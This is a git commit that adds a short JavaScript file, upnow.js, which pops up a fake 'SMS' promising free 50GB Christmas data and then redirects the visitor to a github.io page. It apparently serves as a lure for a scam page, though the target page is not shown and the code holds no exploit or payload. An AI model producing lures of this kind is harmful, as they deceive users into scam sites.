68f60e84d406d498341adb849bd1dac0344817a1
everylinks <Joeyjosh60@gmail.com>
2024-12-25 13:32:49 +0100

    Create upnow.js

---
+++ upnow.js
@@ -0,0 +1,6 @@
+
+var password = 'FREE 50GB'
+password=prompt('SMS :Congratulations you quallify for free 50GB christmas day data, click OK to check  ','FREE 50GB');
+if (password != 'FREE 50GB') {
+location.href='https://everylinks.github.io/Christmas-day-50GB';
+}
